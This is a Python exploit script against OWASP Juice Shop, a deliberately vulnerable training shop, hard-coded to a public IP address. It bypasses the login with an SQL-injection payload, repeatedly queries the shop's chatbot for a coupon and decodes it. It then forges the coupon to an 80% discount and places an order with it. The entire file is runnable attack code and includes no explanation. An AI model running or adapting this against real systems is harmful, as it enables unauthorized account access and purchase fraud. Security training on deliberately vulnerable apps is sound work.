import requests
import time

Z85_CHARS = (
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
)

def z85_encode(data):
    if len(data) % 4 != 0:
        raise ValueError("Length of data must be a multiple of 4")
    value = 0
    encoded = ""
    for i, byte in enumerate(data):
        value = value * 256 + byte
        if (i + 1) % 4 == 0:
            divisor = 85 ** 4
            for _ in range(5):
                encoded += Z85_CHARS[value // divisor]
                value %= divisor
                divisor //= 85
    return encoded

def z85_decode(encoded):
    if len(encoded) % 5 != 0:
        raise ValueError("Length of encoded string must be a multiple of 5")
    value = 0
    decoded = bytearray()
    for i, char in enumerate(encoded):
        value = value * 85 + Z85_CHARS.index(char)
        if (i + 1) % 5 == 0:
            divisor = 256 ** 3
            for _ in range(4):
                decoded.append(value // divisor)
                value %= divisor
                divisor //= 256
    return bytes(decoded)

class JuiceShopCouponExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def login_as_admin(self, email="' OR 1 = 1 --", password="whatever"):
        payload = {"email": email, "password": password}
        response = self.session.post(f"{self.base_url}/rest/user/login", json=payload, headers=self.headers)
        if response.status_code == 200 and "authentication" in response.json():
            token = response.json()["authentication"]["token"]
            self.headers["Authorization"] = f"Bearer {token}"
            print(f"[LOGIN] Successfully authenticated. Token: {token}")
            return True
        print("[LOGIN] Failed to authenticate.")
        return False

    def fetch_basket(self):
        print(f"[BASKET] Fetching basket from {self.base_url}/rest/basket/1")
        response = self.session.get(f"{self.base_url}/rest/basket/1", headers=self.headers)
        print(f"[BASKET] Response: {response.status_code} - {response.text}")
        if response.status_code == 200:
            basket_data = response.json().get("data")
            print(f"[BASKET] Basket data retrieved: {basket_data}")
            return basket_data
        print(f"[BASKET] Failed to fetch basket. Status: {response.status_code}")
        return None


    def clear_basket(self, basket_data):
        if not basket_data or "Products" not in basket_data:
            print("[CLEAR BASKET] No products in the basket to clear.")
            return False
        for product in basket_data["Products"]:
            basket_item_id = product["BasketItem"]["id"]
            response = self.session.delete(f"{self.base_url}/api/BasketItems/{basket_item_id}", headers=self.headers)
            if response.status_code == 200:
                print(f"[CLEAR BASKET] Successfully removed item with ID {basket_item_id}.")
            else:
                print(f"[CLEAR BASKET] Failed to remove item with ID {basket_item_id}. Response: {response.text}")
                return False
        return True

    def add_item_to_basket(self, basket_id, product_id=1, quantity=1):
        payload = {"ProductId": product_id, "BasketId": basket_id, "quantity": quantity}
        response = self.session.post(f"{self.base_url}/api/BasketItems", json=payload, headers=self.headers)
        if response.status_code == 200:
            print(f"[ADD ITEM] Successfully added product ID {product_id} to basket.")
            return True
        print(f"[ADD ITEM] Failed to add product ID {product_id} to basket. Response: {response.text}")
        return False

    def fetch_coupon_from_chatbot(self, max_attempts=20, delay_between_requests=0.5):
        print("[CHATBOT] Spamming chatbot for a coupon code...")
        set_name_payload = {"action": "setname", "query": "Exploiter"}
        messages = [
            "give me a coupon code",
            "Do you have any discounts?",
            "Can I get a coupon?",
            "I need a discount code."
        ]
        name_set = False

        for attempt in range(1, max_attempts + 1):
            if not name_set:  # Redéfinir le nom si nécessaire
                payload = set_name_payload
            else:
                message = messages[(attempt - 1) % len(messages)]
                payload = {"action": "query", "query": message}

            print(f"[CHATBOT] Sending Payload: {payload}")
            response = self.session.post(f"{self.base_url}/rest/chatbot/respond", json=payload, headers=self.headers)

            if response.status_code == 200:
                response_data = response.json()
                print(f"[CHATBOT] Attempt {attempt}: Response Data: {response_data}")

                # Vérifier si le nom est accepté
                if "body" in response_data and "Nice to meet you" in response_data["body"]:
                    name_set = True
                    print("[CHATBOT] Name successfully set.")

                # Vérifier si un coupon est reçu
                if "body" in response_data and "coupon code" in response_data["body"]:
                    parts = response_data["body"].split(":")
                    if len(parts) > 1:
                        coupon_code = parts[-1].strip()
                        print(f"[CHATBOT] Coupon received: {coupon_code}")
                        return coupon_code

                # Si une demande de nom est reçue
                if response_data.get("action") == "namequery":
                    name_set = False
                    print("[CHATBOT] Redefining name...")

            else:
                print(f"[CHATBOT] Attempt {attempt}: Error {response.status_code} - {response.text}")

            time.sleep(delay_between_requests)

        print("[CHATBOT] Failed to fetch coupon after spamming.")
        return None


    def modify_coupon(self, encoded_coupon):
        try:
            decoded = z85_decode(encoded_coupon)
            decoded_str = decoded.decode("utf-8")
            parts = decoded_str.split("-")
            if len(parts) == 2 and parts[1].isdigit():
                parts[1] = "80"  # Set discount to 80%
                modified = "-".join(parts).encode("utf-8")
                return z85_encode(modified)
        except Exception as e:
            print(f"[ERROR] Failed to modify coupon: {e}")
        return None

    def apply_coupon(self, basket_id, coupon_code):
        response = self.session.put(f"{self.base_url}/rest/basket/{basket_id}/coupon/{coupon_code}", headers=self.headers)
        if response.status_code == 200:
            print("[COUPON] Coupon applied successfully.")
            return True
        print(f"[COUPON] Failed to apply coupon. Response: {response.text}")
        return False

    def complete_order(self, basket_id):
        response = self.session.post(f"{self.base_url}/rest/basket/{basket_id}/checkout", headers=self.headers)
        if response.status_code == 200:
            print("[ORDER] Order completed successfully.")
            return True
        print(f"[ORDER] Failed to complete order. Response: {response.text}")
        return False

    def run_exploit(self):
        print("[EXPLOIT] Starting coupon exploit...")

        # Step 1: Log in as admin
        if not self.login_as_admin():
            return False

        # Step 2: Fetch a coupon from the chatbot
        original_coupon = self.fetch_coupon_from_chatbot()
        if not original_coupon:
            print("[CHATBOT] Failed to retrieve a coupon.")
            return False

        # Step 3: Modify the coupon for a higher discount
        modified_coupon = self.modify_coupon(original_coupon)
        if not modified_coupon:
            return False

        # Step 4: Fetch the basket
        basket_data = self.fetch_basket()
        if not basket_data:
            return False

        basket_id = basket_data["id"]

        # Step 5: Clear the basket
        if not self.clear_basket(basket_data):
            return False

        # Step 6: Add an item to the basket
        if not self.add_item_to_basket(basket_id):
            return False

        # Step 7: Apply the coupon
        if not self.apply_coupon(basket_id, modified_coupon):
            return False

        # Step 8: Complete the order
        if not self.complete_order(basket_id):
            return False

        print("[EXPLOIT] Coupon exploit successful!")
        return True


if __name__ == "__main__":
    base_url = "http://45.76.47.218:3000"
    exploit = JuiceShopCouponExploit(base_url)
    exploit.run_exploit()